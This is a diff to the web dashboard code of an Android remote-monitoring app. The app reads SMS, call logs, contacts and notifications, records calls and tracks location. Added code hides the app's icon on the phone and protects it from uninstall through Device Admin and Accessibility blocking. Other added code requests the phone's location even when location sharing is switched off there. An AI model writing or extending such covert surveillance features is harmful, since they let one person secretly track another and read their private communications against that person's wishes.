+            "This file has little/no voice (phone call mic was silent). Enable OnePlus built-in Call recording, then remake the call.";
+          hint.style.color = "#fecaca";
+          return;
+        }
+        if (!audio.ended && !audio.paused) requestAnimationFrame(tick);
+      };
+      audio.addEventListener("play", () => {
+        ctx.resume().catch(() => {});
+        requestAnimationFrame(tick);
+      });
+    } catch {
+      /* AudioContext optional */
+    }
+    wrap.appendChild(audio);
+    wrap.appendChild(hint);
+    wrap.appendChild(dl);
+    mediaViewerBody.appendChild(wrap);
   } else {
     const link = document.createElement("a");
     link.href = url;
@@ -1970,6 +3360,7 @@ function renderMedia(items) {
           <div class="media-card-actions">
             <button type="button" class="btn-secondary btn-open-media" data-media-id="${escapeHtml(m.mediaId)}">View / Play</button>
             <a class="btn-secondary" href="${escapeHtml(url)}" target="_blank" rel="noopener">Open</a>
+            <button type="button" class="btn-danger btn-delete-media" data-media-id="${escapeHtml(m.mediaId)}">Delete</button>
           </div>
         </div>
       </article>`;
@@ -1982,6 +3373,12 @@ function renderMedia(items) {
       const id = btn.getAttribute("data-media-id");
       const item = id ? byId.get(id) : null;
       if (item) openMediaViewer(item);
+    });
+  });
+  mediaList.querySelectorAll(".btn-delete-media").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const id = btn.getAttribute("data-media-id") || "";
+      if (id) void softDeleteUserMedia(id, String(byId.get(id)?.deviceId || ""));
     });
   });
 }
@@ -2007,6 +3404,38 @@ async function refreshMedia() {
 function showPairError(message) {
   pairError.hidden = !message;
   pairError.textContent = message || "";
+}
+
+let pairPollTimer = null;
+
+function stopPairPoll() {
+  if (pairPollTimer) {
+    clearInterval(pairPollTimer);
+    pairPollTimer = null;
+  }
+}
+
+function startPairPoll(maxMs = 120000) {
+  stopPairPoll();
+  const started = Date.now();
+  pairPollTimer = setInterval(async () => {
+    try {
+      await ensureBrowserIdentity();
+      const data = await api("/api/pair/clients");
+      cachedClients = data.clients || [];
+      if (isThisBrowserPaired(cachedClients)) {
+        stopPairPoll();
+        updatePairingUi(true);
+        if (clientList) renderClients(cachedClients);
+        if (pairResult) pairResult.hidden = true;
+        showPairError("");
+        return;
+      }
+      if (Date.now() - started > maxMs) stopPairPoll();
+    } catch {
+      /* keep polling until timeout */
+    }
+  }, 2000);
 }
 
 async function createPairing() {
@@ -2040,6 +3469,7 @@ async function createPairing() {
         errorCorrectionLevel: "M",
       });
     }
+    startPairPoll();
   } catch (e) {
     pairResult.hidden = true;
     showPairError(e instanceof Error ? e.message : String(e));
@@ -2051,6 +3481,9 @@ async function createPairing() {
 function friendlyAuthError(e) {
   const code = e && typeof e.code === "string" ? e.code : "";
   const msg = e instanceof Error ? e.message : String(e || "Auth failed");
+  if (code === "auth/user-disabled") {
+    return "Your account has been disabled by an administrator. Contact support or wait until you are unblocked.";
+  }
   if (code === "auth/invalid-credential" || code === "auth/wrong-password" || code === "auth/user-not-found") {
     return "Wrong email or password";
   }
@@ -2106,8 +3539,12 @@ function setAuthBusy(busy, label) {
 }
 
 async function main() {
+  setBootLoading(true, "Loading…");
+  armBootLoadingWatchdog(12000);
   const cfg = await loadConfig();
   if (!cfg.firebase?.apiKey) {
+    setBootLoading(false);
+    setLoggedOutUi();
     authStatus.textContent = "Missing Firebase web config env vars on server";
     return;
   }
@@ -2115,10 +3552,14 @@ async function main() {
     publicIceServers = cfg.iceServers;
   }
   if (!cfg.firebase.storageBucket) {
+    setBootLoading(false);
+    setLoggedOutUi();
     authStatus.textContent =
       "Missing Firebase storageBucket (set FIREBASE_WEB_STORAGE_BUCKET on the server).";
     return;
   }
+  setBootLoading(true, "Checking sign-in…");
+  armBootLoadingWatchdog(12000);
   const app = initializeApp(cfg.firebase);
   auth = getAuth(app);
   db = getFirestore(app);
@@ -2163,7 +3604,7 @@ async function main() {
       }
     });
   }
-  btnLogin.addEventListener("click", async () => {
+  btnLogin?.addEventListener("click", async () => {
     setAuthBusy(true, "Opening Google...");
     if (btnLogin) {
       btnLogin.dataset.label = btnLogin.dataset.label || "Sign in with Google";
@@ -2185,6 +3626,26 @@ async function main() {
     }
   });
   if (btnLogout) btnLogout.addEventListener("click", () => signOut(auth));
+  document.getElementById("btn-sidebar-change-password")?.addEventListener("click", () => {
+    closeNavDrawer();
+    openPasswordChangeDialog();
+  });
+  document.getElementById("btn-settings-change-password")?.addEventListener("click", () => {
+    openPasswordChangeDialog();
+  });
+  document.getElementById("form-change-password")?.addEventListener("submit", (ev) => {
+    void submitPasswordChange(ev);
+  });
+  document.getElementById("btn-password-dialog-close")?.addEventListener("click", () => {
+    closePasswordChangeDialog();
+  });
+  document.getElementById("btn-password-dialog-cancel")?.addEventListener("click", () => {
+    closePasswordChangeDialog();
+  });
+  document.getElementById("dialog-change-password")?.addEventListener("cancel", (ev) => {
+    ev.preventDefault();
+    closePasswordChangeDialog();
+  });
   if (btnRefresh) btnRefresh.addEventListener("click", () => refreshDevices());
   document.getElementById("workspace-device-select")?.addEventListener("change", () => {
     onWorkspaceDeviceChanged();
@@ -2192,6 +3653,9 @@ async function main() {
   document.getElementById("btn-add-device")?.addEventListener("click", () => {
     const help = document.getElementById("add-device-help");
     if (help) help.hidden = false;
+  });
+  document.getElementById("btn-remove-device")?.addEventListener("click", () => {
+    void removeSelectedWorkspaceDevice();
   });
   document.getElementById("btn-add-device-close")?.addEventListener("click", () => {
     const help = document.getElementById("add-device-help");
@@ -2255,18 +3719,54 @@ async function main() {
       if (pairResult) pairResult.hidden = true;
       showPairError("");
       updatePairingUi(false);
+      setBootLoading(false);
       return;
     }
-    idToken = await user.getIdToken();
-    firebaseUid = user.uid;
-    setLoggedInUi(user);
-    showPanel("phone");
-    await refreshDashboard();
+    try {
+      // Force-refresh so disabled/blocked claims apply quickly after an admin block.
+      idToken = await withTimeout(user.getIdToken(true), 10000, "Auth token");
+      firebaseUid = user.uid;
+      setLoggedInUi(user);
+      // Show the app immediately — do not block the spinner on device APIs.
+      setBootLoading(false);
+      showPanel("phone");
+      await withTimeout(refreshDashboard(), 15000, "Dashboard").catch(async (e) => {
+        if (e && e.code === "ACCOUNT_BLOCKED") return;
+        console.warn("refreshDashboard", e);
+        if (deviceList && !deviceList.querySelector(".device-card")) {
+          deviceList.textContent =
+            e instanceof Error ? e.message : "Could not load devices. Tap Refresh.";
+          deviceList.classList.add("muted");
+        }
+      });
+    } catch (e) {
+      const code = e && typeof e.code === "string" ? e.code : "";
+      if (
+        code === "auth/user-disabled" ||
+        code === "auth/user-token-expired" ||
+        /disabled|USER_DISABLED/i.test(String(e?.message || ""))
+      ) {
+        await forceLogoutBlocked(
+          "Your account has been disabled by an administrator. Sign in again after you are unblocked."
+        );
+        setBootLoading(false);
+        return;
+      }
+      setLoggedInUi(user);
+      setBootLoading(false);
+      if (authStatus) {
+        authStatus.textContent = e instanceof Error ? e.message : String(e);
+      }
+    }
   });
 }
 
 main().catch((e) => {
-  authStatus.textContent = e instanceof Error ? e.message : String(e);
+  setBootLoading(false);
+  setLoggedOutUi();
+  if (authStatus) {
+    authStatus.textContent = e instanceof Error ? e.message : String(e);
+  }
 });
 
 /* ——— PWA install + service worker ——— */
@@ -2285,6 +3785,20 @@ function isStandaloneDisplay() {
     window.matchMedia("(display-mode: standalone)").matches ||
     /** @type {Navigator & { standalone?: boolean }} */ (navigator).standalone === true
   );
+}
+
+/** Keep the installed PWA / mobile UI in portrait — never rotate with the phone. */
+function lockPortraitOrientation() {
+  try {
+    const orient = screen.orientation || screen.mozOrientation || screen.msOrientation;
+    if (orient && typeof orient.lock === "function") {
+      orient.lock("portrait").catch(() => {
+        orient.lock("portrait-primary").catch(() => {});
+      });
+    }
+  } catch {
+    // Browser may require fullscreen / installed PWA; manifest covers that case.
+  }
 }
 
 function updatePwaInstallUi() {
@@ -2340,6 +3854,7 @@ function setupPwa() {
   window.addEventListener("appinstalled", () => {
     deferredInstallPrompt = null;
     updatePwaInstallUi();
+    lockPortraitOrientation();
   });
 
   document.getElementById("btn-install-pwa")?.addEventListener("click", () => {
@@ -2356,6 +3871,11 @@ function setupPwa() {
   }
 
   updatePwaInstallUi();
+  lockPortraitOrientation();
+  window.addEventListener("orientationchange", () => lockPortraitOrientation());
+  document.addEventListener("visibilitychange", () => {
+    if (document.visibilityState === "visible") lockPortraitOrientation();
+  });
 }
 
 setupPwa();
@@ -2375,7 +3895,7 @@ function fillDeviceSelect(selectEl) {
 
 function requireClientId() {
   const clientId = preferredClientId(cachedClients);
-  if (!clientId) throw new Error("Pair this browser first (Trusted Browsers / Pair).");
+  if (!clientId) throw new Error("Pair this browser first (Pair Browser menu).");
   return clientId;
 }
 
@@ -2383,6 +3903,7 @@ let galleryFilter = "all";
 let locationMapZoom = 16;
 let locationMapCoords = null;
 let locationAutoFetchInFlight = false;
+let locationLastRenderKey = "";
 
 function googleMapsEmbedUrl(lat, lon, zoom) {
   const z = Math.min(20, Math.max(3, Number(zoom) || 16));
@@ -2397,6 +3918,36 @@ function googleMapsOpenUrl(lat, lon, zoom) {
   return `https://www.google.com/maps?q=${encodeURIComponent(`${lat},${lon}`)}&z=${z}`;
 }
 
+function locationRenderKey(deviceId, lat, lon, zoom) {
+  return `${deviceId}|${lat.toFixed(5)}|${lon.toFixed(5)}|${zoom}`;
+}
+
+function updateLocationCardMeta(deviceId, device, loc) {
+  const body = document.getElementById("location-panel-body");
+  if (!body) return;
+  const lat = Number(loc.latitude);
+  const lon = Number(loc.longitude);
+  const mode = String(device.locationSharingMode || loc.sharingMode || "");
+  const updated = loc.capturedAt ? new Date(loc.capturedAt).toLocaleString() : "—";
+  const acc = loc.accuracyMeters != null ? `${loc.accuracyMeters} m` : "—";
+  const title = body.querySelector(".location-map-meta strong");
+  const modeEl = body.querySelector(".location-map-meta .muted");
+  const coords = body.querySelector(".location-coords");
+  const updatedEl = body.querySelector(".location-updated");
+  if (title) title.textContent = device.deviceName || deviceId;
+  if (modeEl && modeEl.textContent.includes("mode")) {
+    modeEl.textContent = ` · mode ${mode}`;
+  }
+  if (coords) {
+    coords.textContent = `Lat ${lat.toFixed(6)} · Lon ${lon.toFixed(6)} · accuracy ${acc}`;
+  }
+  if (updatedEl) {
+    updatedEl.textContent = `Updated ${updated}`;
+  }
+  const open = body.querySelector(".location-map-actions a");
+  if (open) open.setAttribute("href", googleMapsOpenUrl(lat, lon, locationMapZoom));
+}
+
 function renderLocationCard(deviceId, device, loc) {
   const body = document.getElementById("location-panel-body");
   if (!body || !loc) return;
@@ -2406,8 +3957,31 @@ function renderLocationCard(deviceId, device, loc) {
     body.textContent = "Invalid coordinates from phone.";
     return;
   }
-  locationMapCoords = { lat, lon };
   if (!Number.isFinite(locationMapZoom)) locationMapZoom = 16;
+  const key = locationRenderKey(deviceId, lat, lon, locationMapZoom);
+  const hasCard = Boolean(body.querySelector(".location-map-card"));
+
+  // Same place — update text only. Reloading the iframe causes the 2–3 blinks.
+  if (hasCard && key === locationLastRenderKey) {
+    updateLocationCardMeta(deviceId, device, loc);
+    return;
+  }
+
+  const sameSpot =
+    hasCard &&
+    locationMapCoords &&
+    Math.abs(locationMapCoords.lat - lat) < 0.00005 &&
+    Math.abs(locationMapCoords.lon - lon) < 0.00005;
+
+  locationMapCoords = { lat, lon };
+
+  if (sameSpot) {
+    updateLocationCardMeta(deviceId, device, loc);
+    locationLastRenderKey = key;
+    return;
+  }
+
+  locationLastRenderKey = key;
   const embed = googleMapsEmbedUrl(lat, lon, locationMapZoom);
   const openUrl = googleMapsOpenUrl(lat, lon, locationMapZoom);
   const mode = String(device.locationSharingMode || loc.sharingMode || "");
@@ -2421,7 +3995,7 @@ function renderLocationCard(deviceId, device, loc) {
           <strong>${escapeHtml(device.deviceName || deviceId)}</strong>
           <span class="muted"> · mode ${escapeHtml(mode)}</span>
           <p class="location-coords">Lat ${lat.toFixed(6)} · Lon ${lon.toFixed(6)} · accuracy ${escapeHtml(acc)}</p>
-          <p class="muted">Updated ${escapeHtml(updated)}</p>
+          <p class="muted location-updated">Updated ${escapeHtml(updated)}</p>
         </div>
         <div class="location-map-actions">
           <button type="button" class="btn-secondary" id="btn-map-zoom-out" title="Zoom out">−</button>
@@ -2457,12 +4031,19 @@ function applyLocationMapZoom() {
   const label = document.getElementById("location-zoom-label");
   if (label) label.textContent = `Zoom ${locationMapZoom}`;
   if (frame) {
-    frame.src = googleMapsEmbedUrl(
+    const next = googleMapsEmbedUrl(
       locationMapCoords.lat,
       locationMapCoords.lon,
       locationMapZoom
     );
+    if (frame.src !== next) frame.src = next;
   }
+  locationLastRenderKey = locationRenderKey(
+    selectedWorkspaceDeviceId || "",
+    locationMapCoords.lat,
+    locationMapCoords.lon,
+    locationMapZoom
+  );
 }
 
 async function requestCurrentLocationSilent(deviceId) {
@@ -2496,14 +4077,15 @@ async function refreshLocationPanel(opts = {}) {
   try {
     let data = await api(`/api/device/location?deviceId=${encodeURIComponent(deviceId)}`);
     let loc = data.location;
-    const device = data.device || {};
-    if (!device.locationSharingEnabled) {
-      body.innerHTML =
-        `<p class="error">Location sharing is disabled on the phone. Turn it on under Device Management → Location Sharing.</p>`;
-      return;
-    }
+    let device = data.device || {};
 
-    if (loc && Number.isFinite(Number(loc.latitude))) {
+    // If sharing flag is off, still request — phone enables it when OS permission exists.
+    if (!device.locationSharingEnabled) {
+      if (!body.querySelector(".location-map-card")) {
+        body.innerHTML =
+          `<p class="muted">Location sharing was off on this phone — requesting a fix… Open the phone app once if this stays empty.</p>`;
+      }
+    } else if (loc && Number.isFinite(Number(loc.latitude))) {
       renderLocationCard(deviceId, device, loc);
     }
 
@@ -2511,12 +4093,27 @@ async function refreshLocationPanel(opts = {}) {
       locationAutoFetchInFlight = true;
       try {
         await requestCurrentLocationSilent(deviceId);
-        for (let i = 0; i < 5; i++) {
-          await new Promise((r) => setTimeout(r, 1200));
+        let lastKey = "";
+        for (let i = 0; i < 4; i++) {
+          await new Promise((r) => setTimeout(r, i === 0 ? 1500 : 2000));
           data = await api(`/api/device/location?deviceId=${encodeURIComponent(deviceId)}`);
           loc = data.location;
+          device = data.device || device;
           if (loc && Number.isFinite(Number(loc.latitude))) {
-            renderLocationCard(deviceId, data.device || device, loc);
+            const key = locationRenderKey(
+              deviceId,
+              Number(loc.latitude),
+              Number(loc.longitude),
+              locationMapZoom
+            );
+            if (key !== lastKey) {
+              renderLocationCard(deviceId, device, loc);
+              lastKey = key;
+            } else {
+              updateLocationCardMeta(deviceId, device, loc);
+            }
+            // Got a stable fix — stop polling early (avoids map blink).
+            if (i >= 1 && Number(loc.accuracyMeters || 999) <= 100) break;
           }
         }
       } catch (e) {
@@ -2524,7 +4121,10 @@ async function refreshLocationPanel(opts = {}) {
         if (!loc) {
           if (/locationCurrent|CAPABILITY_DENIED|lacks capability/i.test(msg)) {
             body.innerHTML =
-              `<p class="error">Allow location for this browser on the phone: Trusted Browsers → Permissions → current &amp; live location.</p>`;
+              `<p class="error">Allow location for this browser on the phone: phone Permissions card → Permissions → current &amp; live location.</p>`;
+          } else if (/PERMISSION_DENIED|permission not granted/i.test(msg)) {
+            body.innerHTML =
+              `<p class="error">Grant Location permission on the phone (Remote Camera &amp; Voice → Permissions).</p>`;
           } else {
             body.innerHTML = `<p class="error">${escapeHtml(msg)}</p>`;
           }
@@ -2535,9 +4135,11 @@ async function refreshLocationPanel(opts = {}) {
       }
     }
 
-    if (!loc) {
-      body.innerHTML =
-        `<p class="muted">Waiting for GPS fix... Tap <strong>Update location</strong> if the map does not appear.</p>`;
+    if (!loc || !Number.isFinite(Number(loc.latitude))) {
+      if (!body.querySelector(".location-map-card")) {
+        body.innerHTML =
+          `<p class="muted">Waiting for GPS fix… Tap <strong>Update location</strong> if the map does not appear. On the phone, open Remote Camera &amp; Voice once so Location Sharing can sync.</p>`;
+      }
       return;
     }
     renderLocationCard(deviceId, data.device || device, loc);
@@ -2588,12 +4190,87 @@ function formatInfoValue(key, value) {
   if (typeof value === "object") return null;
   const s = String(value);
   if (s === "granted") return "Granted";
-  if (s === "denied") return "Denied";
+  if (s === "denied") return "Not granted";
   if (s === "unknown") return "Unknown";
+  if (s === "n/a" || /^not available/i.test(s)) return "Not required on this Android version";
   if (isEpochTimestampKey(key) && /^\d{12,}$/.test(s)) {
     return formatEpochDateTime(s);
   }
   return s;
+}
+
+function formatPermissionStatus(value) {
+  if (value == null || value === "") return { label: "Unknown — tap Refresh Information", cls: "perm-unknown" };
+  if (typeof value === "boolean") {
+    return value
+      ? { label: "Granted", cls: "perm-ok" }
+      : { label: "Not granted", cls: "perm-bad" };
+  }
+  const s = String(value).trim().toLowerCase();
+  if (s === "granted" || s === "true" || s === "yes" || s === "1") {
+    return { label: "Granted", cls: "perm-ok" };
+  }
+  if (s === "denied" || s === "false" || s === "no" || s === "0") {
+    return { label: "Not granted", cls: "perm-bad" };
+  }
+  if (s === "n/a" || s.startsWith("not available")) {
+    return { label: "Not required on this Android version", cls: "perm-na" };
+  }
+  if (s === "unknown") {
+    return { label: "Unknown — tap Refresh Information", cls: "perm-unknown" };
+  }
+  return { label: String(value), cls: "" };
+}
+
+const DEVICE_PERMISSION_ROWS = [
+  ["camera", "Camera"],
+  ["microphone", "Microphone"],
+  ["fineLocation", "Precise location"],
+  ["coarseLocation", "Approximate location"],
+  ["backgroundLocation", "Background location"],
+  ["readImages", "Photos"],
+  ["readVideo", "Videos"],
+  ["readAudio", "Audio files"],
+  ["readStorage", "Storage (Android 12 and older)"],
+  ["contacts", "Contacts"],
+  ["sms", "Read SMS"],
+  ["receiveSms", "Receive SMS"],
+  ["callLog", "Call logs"],
+  ["phoneState", "Phone state"],
+  ["outgoingCalls", "Outgoing calls"],
+  ["callRecordingReady", "Call recording (mic + phone + call log)"],
+  ["notificationListener", "Notification access"],
+  ["usageAccess", "Usage access (recent apps)"],
+  ["folderAccess", "File manager folders"],
+  ["accessibility", "Accessibility service"],
+  ["deviceAdmin", "Device admin"],
+  ["batteryOptimizationIgnored", "Ignore battery optimization"],
+];
+
+function mergeDevicePermissions(info, device) {
+  const src = info?.permissions && typeof info.permissions === "object" ? { ...info.permissions } : {};
+  if (!device) return src;
+  const fill = (key, raw) => {
+    if (src[key] != null && src[key] !== "" && String(src[key]).toLowerCase() !== "unknown") return;
+    if (raw == null || raw === "" || String(raw).toLowerCase() === "unknown") return;
+    src[key] = raw;
+  };
+  fill("camera", device.cameraPermission);
+  fill("microphone", device.microphonePermission);
+  return src;
+}
+
+function renderPermissionsSection(info, device) {
+  const data = mergeDevicePermissions(info, device);
+  const extraKeys = Object.keys(data).filter((k) => !DEVICE_PERMISSION_ROWS.some(([key]) => key === k));
+  const rows = [...DEVICE_PERMISSION_ROWS, ...extraKeys.map((k) => [k, infoLabel(k)])];
+  const html = rows
+    .map(([key, label]) => {
+      const st = formatPermissionStatus(data[key]);
+      return `<div class="info-row"><span class="info-label">${escapeHtml(label)}</span><span class="info-value ${st.cls}">${escapeHtml(st.label)}</span></div>`;
+    })
+    .join("");
+  return `<section class="info-section"><h3>Permissions</h3>${html}</section>`;
 }
 
 function infoLabel(key) {
@@ -2662,28 +4339,57 @@ function infoLabel(key) {
     readVideo: "Videos access",
     readAudio: "Audio access",
     readStorage: "Storage access",
+    contacts: "Contacts",
+    sms: "SMS / messages",
+    receiveSms: "Receive SMS",
+    callLog: "Call logs",
+    phoneState: "Phone state",
+    outgoingCalls: "Outgoing calls",
+    callRecordingReady: "Call recording ready",
+    notificationListener: "Notification access",
+    usageAccess: "Usage access (recent apps)",
+    folderAccess: "File manager folders",
+    accessibility: "Accessibility service",
+    deviceAdmin: "Device admin",
+    batteryOptimizationIgnored: "Battery optimization ignored",
     remoteControlEnabled: "Remote control",
     notificationListenerEnabled: "Notification listener",
     locationSharingEnabled: "Location sharing",
     galleryAccessEnabled: "Gallery access",
     fileManagerEnabled: "File manager",
+    screenMirrorEnabled: "Screen mirroring",
+    screenRecordEnabled: "Screen recording",
+    installedAppsSharingEnabled: "Installed apps sharing",
+    appUsageSharingEnabled: "Recent apps sharing",
+    appControlEnabled: "App control",
+    remoteAccessibilityEnabled: "Remote accessibility",
+    notificationMirrorEnabled: "Notification mirror",
+    messagesSharingEnabled: "Messages sharing",
+    callLogsSharingEnabled: "Call logs sharing",
+    contactsSharingEnabled: "Contacts sharing",
     fcmTokenPresent: "Push token ready",
     lastSyncAt: "Last sync",
   };
   return labels[key] || key.replace(/([A-Z])/g, " $1").replace(/^./, (c) => c.toUpperCase());
 }
 
-function renderInfoSection(title, data) {
+function renderInfoSection(title, data, skipKeys) {
   if (!data || typeof data !== "object") {
     return `<section class="info-section"><h3>${escapeHtml(title)}</h3><p class="muted">Not available</p></section>`;
   }
+  const skip = skipKeys instanceof Set ? skipKeys : new Set(skipKeys || []);
   const rows = Object.entries(data)
     .map(([key, value]) => {
+      if (skip.has(key)) return "";
       if (value && typeof value === "object" && !Array.isArray(value)) return "";
       const display = formatInfoValue(key, value);
       if (display == null) return "";
       const permClass =
-        display === "Granted" ? "perm-ok" : display === "Denied" ? "perm-bad" : "";
+        display === "Granted"
+          ? "perm-ok"
+          : display === "Not granted" || display === "Denied"
+            ? "perm-bad"
+            : "";
       return `<div class="info-row"><span class="info-label">${escapeHtml(infoLabel(key))}</span><span class="info-value ${permClass}">${escapeHtml(display)}</span></div>`;
     })
     .filter(Boolean)
@@ -2691,7 +4397,7 @@ function renderInfoSection(title, data) {
   return `<section class="info-section"><h3>${escapeHtml(title)}</h3>${rows || '<p class="muted">Not available</p>'}</section>`;
 }
 
-function renderDeviceInfoHuman(info) {
+function renderDeviceInfoHuman(info, device) {
   if (!info || typeof info !== "object") {
     return `<p class="muted">No device info yet. Tap Refresh Information on the phone-enabled device.</p>`;
   }
@@ -2709,8 +4415,8 @@ function renderDeviceInfoHuman(info) {
       ${renderInfoSection("Camera", info.camera)}
       ${renderInfoSection("Sensors", info.sensors)}
       ${renderInfoSection("Network", info.network)}
-      ${renderInfoSection("Permissions", info.permissions)}
-      ${renderInfoSection("App status", info.appState)}
+      ${renderPermissionsSection(info, device)}
+      ${renderInfoSection("App modules", info.appState, ["notificationListenerEnabled"])}
     </div>`;
 }
 
@@ -2723,18 +4429,186 @@ async function refreshInfoPanel() {
   if (!body) return;
   if (!deviceId) {
     body.textContent = "No devices.";
+    syncUninstallPolicyUi(null);
+    syncLauncherVisibilityUi(null);
     return;
   }
   body.textContent = "Loading…";
   try {
     const data = await api(`/api/device/info?deviceId=${encodeURIComponent(deviceId)}`);
+    const device = (cachedDevices || []).find((d) => d.deviceId === deviceId) || null;
     body.innerHTML = data.info
-      ? renderDeviceInfoHuman(data.info)
-      : `<p class="muted">No device info yet. Tap Refresh Information.</p>`;
+      ? renderDeviceInfoHuman(data.info, device)
+      : renderDeviceInfoHuman({ permissions: {} }, device);
+    syncUninstallPolicyUi(device);
+    syncLauncherVisibilityUi(device);
   } catch (e) {
     body.textContent = e instanceof Error ? e.message : String(e);
+    syncUninstallPolicyUi(null);
+    syncLauncherVisibilityUi(null);
   }
 }
+
+function syncLauncherVisibilityUi(device) {
+  const toggle = document.getElementById("toggle-launcher-hidden");
+  const status = document.getElementById("launcher-visibility-status");
+  if (!toggle) return;
+  const hidden = Boolean(device?.launcherHidden);
+  toggle.checked = hidden;
+  if (status) {
+    if (!device) {
+      status.textContent = "Select a device.";
+    } else if (hidden) {
+      status.textContent =
+        "Icon is hidden on the phone. Turn this off to show the icon again (open without dialer passcode).";
+    } else {
+      status.textContent = "App icon is visible on the phone home screen / app drawer.";
+    }
+  }
+}
+
+async function setLauncherHidden(hidden) {
+  const deviceId = selectedWorkspaceDeviceId || document.getElementById("info-device-select")?.value;
+  const status = document.getElementById("launcher-visibility-status");
+  const toggle = document.getElementById("toggle-launcher-hidden");
+  if (!deviceId) {
+    alert("Select a device first");
+    if (toggle) toggle.checked = !hidden;
+    return;
+  }
+  const clientId = requireClientId();
+  if (status) status.textContent = "Saving…";
+  try {
+    const data = await api("/api/device/launcher-visibility", {
+      method: "POST",
+      body: JSON.stringify({ deviceId, clientId, launcherHidden: Boolean(hidden) }),
+    });
+    const d = (cachedDevices || []).find((x) => x.deviceId === deviceId);
+    if (d) d.launcherHidden = Boolean(data.launcherHidden);
+    syncLauncherVisibilityUi(d || { launcherHidden: data.launcherHidden });
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    if (status) status.textContent = msg;
+    if (toggle) toggle.checked = !hidden;
+    alert(msg || "Could not update app icon visibility");
+  }
+}
+
+document.getElementById("toggle-launcher-hidden")?.addEventListener("change", (ev) => {
+  const on = Boolean(ev.target?.checked);
+  void setLauncherHidden(on);
+});
+
+function syncUninstallPolicyUi(device) {
+  const toggle = document.getElementById("toggle-allow-uninstall");
+  const status = document.getElementById("uninstall-policy-status");
+  if (!toggle) return;
+  // Default allow (checked) unless the device explicitly disables uninstall.
+  const allow = !device || device.allowUninstall !== false;
+  toggle.checked = allow;
+  if (status) {
+    if (!device) {
+      status.textContent = "Select a device.";
+    } else if (allow) {
+      status.textContent =
+        "Uninstall allowed (default). Uncheck to protect this device from uninstall.";
+    } else {
+      const admin = device.deviceAdminReady ? "Device Admin on" : "Device Admin off — enable it on the phone for stronger protection";
+      status.textContent = `Uninstall protected. ${admin}. Accessibility helps block uninstall screens.`;
+    }
+  }
+}
+
+async function setAllowUninstall(allow) {
+  const deviceId = selectedWorkspaceDeviceId || document.getElementById("info-device-select")?.value;
+  const status = document.getElementById("uninstall-policy-status");
+  if (!deviceId) {
+    alert("Select a device first");
+    return;
+  }
+  const clientId = requireClientId();
+  if (status) status.textContent = "Saving…";
+  try {
+    const data = await api("/api/device/uninstall-policy", {
+      method: "POST",
+      body: JSON.stringify({ deviceId, clientId, allowUninstall: Boolean(allow) }),
+    });
+    const d = (cachedDevices || []).find((x) => x.deviceId === deviceId);
+    if (d) {
+      d.allowUninstall = Boolean(data.allowUninstall);
+      d.uninstallProtected = Boolean(data.uninstallProtected);
+    }
+    syncUninstallPolicyUi(d || { allowUninstall: data.allowUninstall, deviceAdminReady: false });
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    if (status) status.textContent = msg;
+    const toggle = document.getElementById("toggle-allow-uninstall");
+    if (toggle) toggle.checked = !allow;
+    alert(msg || "Could not update uninstall policy");
+  }
+}
+
+document.getElementById("toggle-allow-uninstall")?.addEventListener("change", (ev) => {
+  const on = Boolean(ev.target?.checked);
+  void setAllowUninstall(on);
+});
+
+async function uninstallAppFromDevice() {
+  const deviceId = selectedWorkspaceDeviceId || document.getElementById("info-device-select")?.value;
+  const status = document.getElementById("uninstall-app-status");
+  if (!deviceId) {
+    alert("Select a device first");
+    return;
+  }
+  const ok = window.confirm(
+    "Uninstall AutoReplyBot from this phone?\n\nThis removes Device Admin protection and opens the system uninstall screen. The phone must be online and App Control (Accessibility) should be ON for auto-confirm."
+  );
+  if (!ok) return;
+  const clientId = requireClientId();
+  if (status) status.textContent = "Sending uninstall command…";
+  try {
+    const data = await api("/api/device/uninstall-app", {
+      method: "POST",
+      body: JSON.stringify({ deviceId, clientId }),
+    });
+    const d = (cachedDevices || []).find((x) => x.deviceId === deviceId);
+    if (d) {
+      d.allowUninstall = true;
+      d.uninstallProtected = false;
+    }
+    syncUninstallPolicyUi(d || { allowUninstall: true, deviceAdminReady: false });
+    const commandId = data?.command?.commandId;
+    if (!commandId) {
+      throw new Error("No command id returned from server");
+    }
+    if (status) status.textContent = "Waiting for phone to open uninstall screen…";
+    try {
+      await api("/api/device/command/poke", {
+        method: "POST",
+        body: JSON.stringify({ deviceId, commandId }),
+      });
+    } catch {
+      /* ignore */
+    }
+    const result = await waitModuleCommand(commandId, { timeoutMs: 60000 });
+    if (result.status === "failed" || result.status === "ignored" || result.status === "expired") {
+      throw new Error(result.errorMessage || result.errorCode || "Phone did not accept uninstall command");
+    }
+    if (status) {
+      status.textContent =
+        "Phone opened uninstall screen. If it did not appear, unlock the phone and tap the notification. Keep Accessibility ON to auto-confirm OK.";
+    }
+    return data;
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    if (status) status.textContent = msg;
+    alert(msg || "Could not send uninstall command");
+  }
+}
+
+document.getElementById("btn-uninstall-app")?.addEventListener("click", () => {
+  void uninstallAppFromDevice();
+});
 
 function galleryCacheKey(deviceId, itemId) {
   return `${deviceId}::${itemId}`;
@@ -3436,9 +5310,13 @@ async function refreshMessagesPanel() {
   const deviceId =
     selectedWorkspaceDeviceId || document.getElementById("messages-device-select")?.value;
   const list = document.getElementById("messages-list");
+  const selectBar = document.getElementById("messages-select-bar");
+  const btnDelete = document.getElementById("btn-msg-delete");
   if (!list) return;
   if (!deviceId) {
     list.textContent = "No devices.";
+    if (selectBar) selectBar.hidden = true;
+    if (btnDelete) btnDelete.disabled = true;
     return;
   }
   list.textContent = "Loading messages...";
@@ -3454,9 +5332,12 @@ async function refreshMessagesPanel() {
         "On the phone: Permissions → SMS / Messages → allow.\n" +
         "Trusted browsers → allow reading SMS / messages.\n" +
         "Then Sync from phone. New SMS appear automatically.";
+      if (selectBar) selectBar.hidden = true;
+      if (btnDelete) btnDelete.disabled = true;
       return;
     }
     list.classList.remove("muted");
+    if (selectBar) selectBar.hidden = false;
     const groups = groupItemsByDay(items, "date");
     list.innerHTML = `<div class="msg-day-list">${groups
       .map(([dayKey, dayItems], index) => {
@@ -3473,19 +5354,28 @@ async function refreshMessagesPanel() {
           <div class="msg-day-body"${hidden}>
             <div class="msg-grid">${dayItems
               .map((it) => {
+                const id = escapeHtml(it.itemId || "");
                 const name = escapeHtml(it.senderName || "");
                 const number = escapeHtml(it.address || "(unknown)");
                 const who = name ? `${name} · ${number}` : number;
                 const body = escapeHtml(it.body || "");
                 const when = escapeHtml(formatNotifDate(it.date));
